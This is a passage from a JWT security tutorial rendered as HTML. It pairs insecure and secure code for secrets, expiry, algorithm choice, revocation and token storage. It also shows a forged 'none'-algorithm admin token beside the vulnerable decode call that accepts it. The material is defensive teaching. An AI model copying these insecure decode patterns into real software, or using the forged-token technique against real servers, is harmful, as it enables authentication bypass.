<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="c1">#  BAD: Hardcoded secret</span>
<a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="n">secret</span> <span class="o">=</span> <span class="s2">&quot;mypassword123&quot;</span>
<a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>
<a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a><span class="c1">#  GOOD: Environment variable, strong key</span>
<a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a><span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
<a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a><span class="kn">import</span><span class="w"> </span><span class="nn">secrets</span>
<a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a>
<a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a><span class="c1"># Generate strong secret (one-time)</span>
<a id="__codelineno-21-9" name="__codelineno-21-9" href="#__codelineno-21-9"></a><span class="n">secret</span> <span class="o">=</span> <span class="n">secrets</span><span class="o">.</span><span class="n">token_urlsafe</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>
<a id="__codelineno-21-10" name="__codelineno-21-10" href="#__codelineno-21-10"></a><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Add to .env: JWT_SECRET=</span><span class="si">{</span><span class="n">secret</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
<a id="__codelineno-21-11" name="__codelineno-21-11" href="#__codelineno-21-11"></a>
<a id="__codelineno-21-12" name="__codelineno-21-12" href="#__codelineno-21-12"></a><span class="c1"># Load from environment</span>
<a id="__codelineno-21-13" name="__codelineno-21-13" href="#__codelineno-21-13"></a><span class="n">secret</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;JWT_SECRET&#39;</span><span class="p">)</span>
<a id="__codelineno-21-14" name="__codelineno-21-14" href="#__codelineno-21-14"></a><span class="k">if</span> <span class="ow">not</span> <span class="n">secret</span><span class="p">:</span>
<a id="__codelineno-21-15" name="__codelineno-21-15" href="#__codelineno-21-15"></a>    <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&quot;JWT_SECRET not set!&quot;</span><span class="p">)</span>
</code></pre></div>
<h3 id="3-token-expiration">3. <strong>Token Expiration</strong></h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="c1">#  GOOD: Short-lived access token + refresh token</span>
<a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a><span class="n">access_token_ttl</span> <span class="o">=</span> <span class="mi">900</span>      <span class="c1"># 15 minutes</span>
<a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a><span class="n">refresh_token_ttl</span> <span class="o">=</span> <span class="mi">604800</span>  <span class="c1"># 7 days</span>
<a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a>
<a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a><span class="c1"># Include expiration in payload</span>
<a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a><span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
<a id="__codelineno-22-7" name="__codelineno-22-7" href="#__codelineno-22-7"></a>    <span class="s2">&quot;exp&quot;</span><span class="p">:</span> <span class="n">datetime</span><span class="o">.</span><span class="n">utcnow</span><span class="p">()</span> <span class="o">+</span> <span class="n">timedelta</span><span class="p">(</span><span class="n">seconds</span><span class="o">=</span><span class="n">access_token_ttl</span><span class="p">),</span>
<a id="__codelineno-22-8" name="__codelineno-22-8" href="#__codelineno-22-8"></a>    <span class="s2">&quot;iat&quot;</span><span class="p">:</span> <span class="n">datetime</span><span class="o">.</span><span class="n">utcnow</span><span class="p">(),</span>
<a id="__codelineno-22-9" name="__codelineno-22-9" href="#__codelineno-22-9"></a>    <span class="c1"># ...</span>
<a id="__codelineno-22-10" name="__codelineno-22-10" href="#__codelineno-22-10"></a><span class="p">}</span>
</code></pre></div>
<h3 id="4-algorithm-selection">4. <strong>Algorithm Selection</strong></h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="c1">#  BAD: Allow &quot;none&quot; algorithm</span>
<a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="n">jwt</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>  <span class="c1"># NEVER DO THIS!</span>
<a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>
<a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a><span class="c1">#  BAD: Don&#39;t specify algorithms</span>
<a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a><span class="n">jwt</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">secret</span><span class="p">)</span>
<a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a>
<a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a><span class="c1">#  GOOD: Explicitly specify allowed algorithms</span>
<a id="__codelineno-23-8" name="__codelineno-23-8" href="#__codelineno-23-8"></a><span class="n">jwt</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">secret</span><span class="p">,</span> <span class="n">algorithms</span><span class="o">=</span><span class="p">[</span><span class="s2">&quot;HS256&quot;</span><span class="p">])</span>
<a id="__codelineno-23-9" name="__codelineno-23-9" href="#__codelineno-23-9"></a>
<a id="__codelineno-23-10" name="__codelineno-23-10" href="#__codelineno-23-10"></a><span class="c1">#  BETTER: Use asymmetric (RS256) for production</span>
<a id="__codelineno-23-11" name="__codelineno-23-11" href="#__codelineno-23-11"></a><span class="n">jwt</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">public_key</span><span class="p">,</span> <span class="n">algorithms</span><span class="o">=</span><span class="p">[</span><span class="s2">&quot;RS256&quot;</span><span class="p">])</span>
</code></pre></div>
<h3 id="5-payload-security">5. <strong>Payload Security</strong></h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="c1">#  BAD: Sensitive data in JWT</span>
<a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a><span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
<a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>    <span class="s2">&quot;password&quot;</span><span class="p">:</span> <span class="s2">&quot;secret123&quot;</span><span class="p">,</span>      <span class="c1"># NEVER!</span>
<a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a>    <span class="s2">&quot;credit_card&quot;</span><span class="p">:</span> <span class="s2">&quot;1234-5678&quot;</span><span class="p">,</span>   <span class="c1"># NEVER!</span>
<a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a>    <span class="s2">&quot;ssn&quot;</span><span class="p">:</span> <span class="s2">&quot;123-45-6789&quot;</span>          <span class="c1"># NEVER!</span>
<a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a><span class="p">}</span>
<a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a>
<a id="__codelineno-24-8" name="__codelineno-24-8" href="#__codelineno-24-8"></a><span class="c1">#  GOOD: Only necessary, non-sensitive data</span>
<a id="__codelineno-24-9" name="__codelineno-24-9" href="#__codelineno-24-9"></a><span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
<a id="__codelineno-24-10" name="__codelineno-24-10" href="#__codelineno-24-10"></a>    <span class="s2">&quot;sub&quot;</span><span class="p">:</span> <span class="s2">&quot;user_123&quot;</span><span class="p">,</span>
<a id="__codelineno-24-11" name="__codelineno-24-11" href="#__codelineno-24-11"></a>    <span class="s2">&quot;email&quot;</span><span class="p">:</span> <span class="s2">&quot;user@example.com&quot;</span><span class="p">,</span>
<a id="__codelineno-24-12" name="__codelineno-24-12" href="#__codelineno-24-12"></a>    <span class="s2">&quot;role&quot;</span><span class="p">:</span> <span class="s2">&quot;user&quot;</span><span class="p">,</span>
<a id="__codelineno-24-13" name="__codelineno-24-13" href="#__codelineno-24-13"></a>    <span class="s2">&quot;permissions&quot;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&quot;read&quot;</span><span class="p">]</span>
<a id="__codelineno-24-14" name="__codelineno-24-14" href="#__codelineno-24-14"></a><span class="p">}</span>
</code></pre></div>
<h3 id="6-token-revocation">6. <strong>Token Revocation</strong></h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="c1"># Implement token blacklist for logout/compromise</span>
<a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="k">class</span><span class="w"> </span><span class="nc">TokenBlacklist</span><span class="p">:</span>
<a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">blacklist</span> <span class="o">=</span> <span class="nb">set</span><span class="p">()</span>  <span class="c1"># In production: use Redis</span>
<a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a>
<a id="__codelineno-25-6" name="__codelineno-25-6" href="#__codelineno-25-6"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">revoke</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">token</span><span class="p">):</span>
<a id="__codelineno-25-7" name="__codelineno-25-7" href="#__codelineno-25-7"></a><span class="w">        </span><span class="sd">&quot;&quot;&quot;Add token to blacklist&quot;&quot;&quot;</span>
<a id="__codelineno-25-8" name="__codelineno-25-8" href="#__codelineno-25-8"></a>        <span class="c1"># Extract JTI (JWT ID) from token</span>
<a id="__codelineno-25-9" name="__codelineno-25-9" href="#__codelineno-25-9"></a>        <span class="n">payload</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">options</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;verify_signature&quot;</span><span class="p">:</span> <span class="kc">False</span><span class="p">})</span>
<a id="__codelineno-25-10" name="__codelineno-25-10" href="#__codelineno-25-10"></a>        <span class="n">jti</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;jti&#39;</span><span class="p">)</span>
<a id="__codelineno-25-11" name="__codelineno-25-11" href="#__codelineno-25-11"></a>        <span class="k">if</span> <span class="n">jti</span><span class="p">:</span>
<a id="__codelineno-25-12" name="__codelineno-25-12" href="#__codelineno-25-12"></a>            <span class="bp">self</span><span class="o">.</span><span class="n">blacklist</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">jti</span><span class="p">)</span>
<a id="__codelineno-25-13" name="__codelineno-25-13" href="#__codelineno-25-13"></a>            <span class="c1"># In production: store in Redis with TTL = token expiry</span>
<a id="__codelineno-25-14" name="__codelineno-25-14" href="#__codelineno-25-14"></a>
<a id="__codelineno-25-15" name="__codelineno-25-15" href="#__codelineno-25-15"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">is_revoked</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">token</span><span class="p">):</span>
<a id="__codelineno-25-16" name="__codelineno-25-16" href="#__codelineno-25-16"></a><span class="w">        </span><span class="sd">&quot;&quot;&quot;Check if token is revoked&quot;&quot;&quot;</span>
<a id="__codelineno-25-17" name="__codelineno-25-17" href="#__codelineno-25-17"></a>        <span class="k">try</span><span class="p">:</span>
<a id="__codelineno-25-18" name="__codelineno-25-18" href="#__codelineno-25-18"></a>            <span class="n">payload</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">options</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;verify_signature&quot;</span><span class="p">:</span> <span class="kc">False</span><span class="p">})</span>
<a id="__codelineno-25-19" name="__codelineno-25-19" href="#__codelineno-25-19"></a>            <span class="n">jti</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;jti&#39;</span><span class="p">)</span>
<a id="__codelineno-25-20" name="__codelineno-25-20" href="#__codelineno-25-20"></a>            <span class="k">return</span> <span class="n">jti</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">blacklist</span>
<a id="__codelineno-25-21" name="__codelineno-25-21" href="#__codelineno-25-21"></a>        <span class="k">except</span><span class="p">:</span>
<a id="__codelineno-25-22" name="__codelineno-25-22" href="#__codelineno-25-22"></a>            <span class="k">return</span> <span class="kc">True</span>
</code></pre></div>
<h3 id="7-audience-validation">7. <strong>Audience Validation</strong></h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="c1">#  Always validate audience</span>
<a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
<a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>    <span class="s2">&quot;aud&quot;</span><span class="p">:</span> <span class="s2">&quot;https://api.myapp.com&quot;</span><span class="p">,</span>  <span class="c1"># Who can use this token</span>
<a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a>    <span class="c1"># ...</span>
<a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a><span class="p">}</span>
<a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a>
<a id="__codelineno-26-7" name="__codelineno-26-7" href="#__codelineno-26-7"></a><span class="c1"># On verification</span>
<a id="__codelineno-26-8" name="__codelineno-26-8" href="#__codelineno-26-8"></a><span class="n">jwt</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span>
<a id="__codelineno-26-9" name="__codelineno-26-9" href="#__codelineno-26-9"></a>    <span class="n">token</span><span class="p">,</span>
<a id="__codelineno-26-10" name="__codelineno-26-10" href="#__codelineno-26-10"></a>    <span class="n">secret</span><span class="p">,</span>
<a id="__codelineno-26-11" name="__codelineno-26-11" href="#__codelineno-26-11"></a>    <span class="n">algorithms</span><span class="o">=</span><span class="p">[</span><span class="s2">&quot;HS256&quot;</span><span class="p">],</span>
<a id="__codelineno-26-12" name="__codelineno-26-12" href="#__codelineno-26-12"></a>    <span class="n">audience</span><span class="o">=</span><span class="s2">&quot;https://api.myapp.com&quot;</span>  <span class="c1"># Must match!</span>
<a id="__codelineno-26-13" name="__codelineno-26-13" href="#__codelineno-26-13"></a><span class="p">)</span>
</code></pre></div>
<hr />
<h2 id="common-jwt-vulnerabilities">Common JWT Vulnerabilities</h2>
<h3 id="1-none-algorithm-attack">1. <strong>None Algorithm Attack</strong></h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="c1"># Attacker creates token with &quot;alg&quot;: &quot;none&quot;</span>
<a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a><span class="n">malicious_header</span> <span class="o">=</span> <span class="p">{</span>
<a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>    <span class="s2">&quot;alg&quot;</span><span class="p">:</span> <span class="s2">&quot;none&quot;</span><span class="p">,</span>
<a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a>    <span class="s2">&quot;typ&quot;</span><span class="p">:</span> <span class="s2">&quot;JWT&quot;</span>
<a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a><span class="p">}</span>
<a id="__codelineno-27-6" name="__codelineno-27-6" href="#__codelineno-27-6"></a><span class="n">malicious_payload</span> <span class="o">=</span> <span class="p">{</span>
<a id="__codelineno-27-7" name="__codelineno-27-7" href="#__codelineno-27-7"></a>    <span class="s2">&quot;sub&quot;</span><span class="p">:</span> <span class="s2">&quot;admin&quot;</span><span class="p">,</span>
<a id="__codelineno-27-8" name="__codelineno-27-8" href="#__codelineno-27-8"></a>    <span class="s2">&quot;role&quot;</span><span class="p">:</span> <span class="s2">&quot;admin&quot;</span>
<a id="__codelineno-27-9" name="__codelineno-27-9" href="#__codelineno-27-9"></a><span class="p">}</span>
<a id="__codelineno-27-10" name="__codelineno-27-10" href="#__codelineno-27-10"></a>
<a id="__codelineno-27-11" name="__codelineno-27-11" href="#__codelineno-27-11"></a><span class="c1"># If server doesn&#39;t validate algorithm...</span>
<a id="__codelineno-27-12" name="__codelineno-27-12" href="#__codelineno-27-12"></a><span class="c1">#  VULNERABLE CODE:</span>
<a id="__codelineno-27-13" name="__codelineno-27-13" href="#__codelineno-27-13"></a><span class="n">jwt</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>  <span class="c1"># Accepts &quot;none&quot;!</span>
<a id="__codelineno-27-14" name="__codelineno-27-14" href="#__codelineno-27-14"></a>
<a id="__codelineno-27-15" name="__codelineno-27-15" href="#__codelineno-27-15"></a><span class="c1">#  SECURE CODE:</span>
<a id="__codelineno-27-16" name="__codelineno-27-16" href="#__codelineno-27-16"></a><span class="n">jwt</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">secret</span><span class="p">,</span> <span class="n">algorithms</span><span class="o">=</span><span class="p">[</span><span class="s2">&quot;HS256&quot;</span><span class="p">])</span>  <span class="c1"># Rejects &quot;none&quot;</span>
</code></pre></div>
<h3 id="2-algorithm-confusion-rs256-hs256">2. <strong>Algorithm Confusion (RS256  HS256)</strong></h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="c1"># Server uses RS256 (asymmetric)</span>
<a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a><span class="c1"># Attacker switches to HS256 and signs with public key</span>
<a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a>
<a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a><span class="c1">#  PREVENTION: Strictly enforce algorithm</span>
<a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a><span class="n">jwt</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span>
<a id="__codelineno-28-6" name="__codelineno-28-6" href="#__codelineno-28-6"></a>    <span class="n">token</span><span class="p">,</span>
<a id="__codelineno-28-7" name="__codelineno-28-7" href="#__codelineno-28-7"></a>    <span class="n">public_key</span><span class="p">,</span>
<a id="__codelineno-28-8" name="__codelineno-28-8" href="#__codelineno-28-8"></a>    <span class="n">algorithms</span><span class="o">=</span><span class="p">[</span><span class="s2">&quot;RS256&quot;</span><span class="p">]</span>  <span class="c1"># Only allow RS256</span>
<a id="__codelineno-28-9" name="__codelineno-28-9" href="#__codelineno-28-9"></a><span class="p">)</span>
</code></pre></div>
<h3 id="3-weak-secret-key">3. <strong>Weak Secret Key</strong></h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="c1">#  Weak secrets can be brute-forced</span>
<a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a><span class="n">weak_secrets</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;secret&quot;</span><span class="p">,</span> <span class="s2">&quot;password&quot;</span><span class="p">,</span> <span class="s2">&quot;123456&quot;</span><span class="p">,</span> <span class="s2">&quot;jwt&quot;</span><span class="p">]</span>
<a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a>
<a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a><span class="c1">#  Use strong, random secrets (32+ bytes)</span>
<a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a><span class="kn">import</span><span class="w"> </span><span class="nn">secrets</span>
<a id="__codelineno-29-6" name="__codelineno-29-6" href="#__codelineno-29-6"></a><span class="n">strong_secret</span> <span class="o">=</span> <span class="n">secrets</span><span class="o">.</span><span class="n">token_urlsafe</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>
</code></pre></div>
<h3 id="4-token-exposure">4. <strong>Token Exposure</strong></h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a> Exposing JWT in URLs:
<a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>https://api.com/reset-password?token=eyJhbGci...
<a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>
<a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>Problem: Logged in browser history, server logs, proxy logs
<a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a>
<a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a> Use POST body or Authorization header:
<a id="__codelineno-30-7" name="__codelineno-30-7" href="#__codelineno-30-7"></a>Authorization: Bearer eyJhbGci...
</code></pre></div>
<hr />
<h2 id="how-jwt-is-stored-storage-options">How JWT is Stored (Storage Options)</h2>
<h3 id="client-side-storage-comparison">Client-Side Storage Comparison</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>
<a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>                   JWT Storage Options                          
<a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a>
<a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a>                            1. localStorage                     
<a id="__codelineno-31-5" name="__codelineno-31-5" href="#__codelineno-31-5"></a>
<a id="__codelineno-31-6" name="__codelineno-31-6" href="#__codelineno-31-6"></a> Security           Vulnerable to XSS attacks                
<a id="__codelineno-31-7" name="__codelineno-31-7" href="#__codelineno-31-7"></a> Accessibility     JavaScript can read/write                   
<a id="__codelineno-31-8" name="__codelineno-31-8" href="#__codelineno-31-8"></a> Auto-send          Must manually add to requests            
<a id="__codelineno-31-9" name="__codelineno-31-9" href="#__codelineno-31-9"></a> Expiration         No automatic expiration                  
<a id="__codelineno-31-10" name="__codelineno-31-10" href="#__codelineno-31-10"></a> Size Limit        ~5-10 MB                                    
<a id="__codelineno-31-11" name="__codelineno-31-11" href="#__codelineno-31-11"></a> CSRF               Not vulnerable                           
<a id="__codelineno-31-12" name="__codelineno-31-12" href="#__codelineno-31-12"></a> Use Case          SPAs with no sensitive data                 
<a id="__codelineno-31-13" name="__codelineno-31-13" href="#__codelineno-31-13"></a>
<a id="__codelineno-31-14" name="__codelineno-31-14" href="#__codelineno-31-14"></a>                            2. sessionStorage                   
<a id="__codelineno-31-15" name="__codelineno-31-15" href="#__codelineno-31-15"></a>
<a id="__codelineno-31-16" name="__codelineno-31-16" href="#__codelineno-31-16"></a> Security           Vulnerable to XSS attacks                
<a id="__codelineno-31-17" name="__codelineno-31-17" href="#__codelineno-31-17"></a> Accessibility     JavaScript can read/write                   
<a id="__codelineno-31-18" name="__codelineno-31-18" href="#__codelineno-31-18"></a> Auto-send          Must manually add to requests            
<a id="__codelineno-31-19" name="__codelineno-31-19" href="#__codelineno-31-19"></a> Expiration         Cleared on tab close                     
<a id="__codelineno-31-20" name="__codelineno-31-20" href="#__codelineno-31-20"></a> Size Limit        ~5-10 MB                                    
<a id="__codelineno-31-21" name="__codelineno-31-21" href="#__codelineno-31-21"></a> CSRF               Not vulnerable                           
<a id="__codelineno-31-22" name="__codelineno-31-22" href="#__codelineno-31-22"></a> Use Case          Single-tab sessions                         
<a id="__codelineno-31-23" name="__codelineno-31-23" href="#__codelineno-31-23"></a>
<a id="__codelineno-31-24" name="__codelineno-31-24" href="#__codelineno-31-24"></a>                         3. Cookie (HttpOnly)                   
<a id="__codelineno-31-25" name="__codelineno-31-25" href="#__codelineno-31-25"></a>
<a id="__codelineno-31-26" name="__codelineno-31-26" href="#__codelineno-31-26"></a> Security           Protected from XSS                       
<a id="__codelineno-31-27" name="__codelineno-31-27" href="#__codelineno-31-27"></a> Accessibility      JavaScript CANNOT read                   
<a id="__codelineno-31-28" name="__codelineno-31-28" href="#__codelineno-31-28"></a> Auto-send          Automatically sent with requests         
<a id="__codelineno-31-29" name="__codelineno-31-29" href="#__codelineno-31-29"></a> Expiration         Server-controlled                        
<a id="__codelineno-31-30" name="__codelineno-31-30" href="#__codelineno-31-30"></a> Size Limit        ~4 KB                                       
<a id="__codelineno-31-31" name="__codelineno-31-31" href="#__codelineno-31-31"></a> CSRF               Needs CSRF protection                    
<a id="__codelineno-31-32" name="__codelineno-31-32" href="#__codelineno-31-32"></a> Use Case           RECOMMENDED for production              
<a id="__codelineno-31-33" name="__codelineno-31-33" href="#__codelineno-31-33"></a>
<a id="__codelineno-31-34" name="__codelineno-31-34" href="#__codelineno-31-34"></a>                        4. Memory (JavaScript Variable)         
<a id="__codelineno-31-35" name="__codelineno-31-35" href="#__codelineno-31-35"></a>
<a id="__codelineno-31-36" name="__codelineno-31-36" href="#__codelineno-31-36"></a> Security           Most secure (lost on refresh)            
<a id="__codelineno-31-37" name="__codelineno-31-37" href="#__codelineno-31-37"></a> Accessibility     Only in current execution context           
<a id="__codelineno-31-38" name="__codelineno-31-38" href="#__codelineno-31-38"></a> Auto-send          Must manually add to requests            
<a id="__codelineno-31-39" name="__codelineno-31-39" href="#__codelineno-31-39"></a> Expiration         Lost on page refresh                     
<a id="__codelineno-31-40" name="__codelineno-31-40" href="#__codelineno-31-40"></a> Size Limit        No practical limit                          
<a id="__codelineno-31-41" name="__codelineno-31-41" href="#__codelineno-31-41"></a> CSRF               Not vulnerable                           
<a id="__codelineno-31-42" name="__codelineno-31-42" href="#__codelineno-31-42"></a> Use Case          High-security apps (banking)                
<a id="__codelineno-31-43" name="__codelineno-31-43" href="#__codelineno-31-43"></a>
</code></pre></div>
<h3 id="code-examples-storage-implementation">Code Examples: Storage Implementation</h3>
<h4 id="1-localstorage-not-recommended">1. localStorage ( Not Recommended)</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="c1">//  INSECURE: Vulnerable to XSS</span>
<a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="kd">class</span><span class="w"> </span><span class="nx">TokenStorageLocalStorage</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a><span class="w">    </span><span class="nx">saveToken</span><span class="p">(</span><span class="nx">token</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a><span class="w">        </span><span class="nx">localStorage</span><span class="p">.</span><span class="nx">setItem</span><span class="p">(</span><span class="s1">&#39;access_token&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">token</span><span class="p">);</span>
<a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a><span class="w">    </span><span class="p">}</span>
<a id="__codelineno-32-6" name="__codelineno-32-6" href="#__codelineno-32-6"></a>
<a id="__codelineno-32-7" name="__codelineno-32-7" href="#__codelineno-32-7"></a><span class="w">    </span><span class="nx">getToken</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-32-8" name="__codelineno-32-8" href="#__codelineno-32-8"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">localStorage</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="s1">&#39;access_token&#39;</span><span class="p">);</span>
<a id="__codelineno-32-9" name="__codelineno-32-9" href="#__codelineno-32-9"></a><span class="w">    </span><span class="p">}</span>
<a id="__codelineno-32-10" name="__codelineno-32-10" href="#__codelineno-32-10"></a>
<a id="__codelineno-32-11" name="__codelineno-32-11" href="#__codelineno-32-11"></a><span class="w">    </span><span class="nx">removeToken</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-32-12" name="__codelineno-32-12" href="#__codelineno-32-12"></a><span class="w">        </span><span class="nx">localStorage</span><span class="p">.</span><span class="nx">removeItem</span><span class="p">(</span><span class="s1">&#39;access_token&#39;</span><span class="p">);</span>
<a id="__codelineno-32-13" name="__codelineno-32-13" href="#__codelineno-32-13"></a><span class="w">    </span><span class="p">}</span>
<a id="__codelineno-32-14" name="__codelineno-32-14" href="#__codelineno-32-14"></a>
<a id="__codelineno-32-15" name="__codelineno-32-15" href="#__codelineno-32-15"></a><span class="w">    </span><span class="c1">// Must manually add to requests</span>
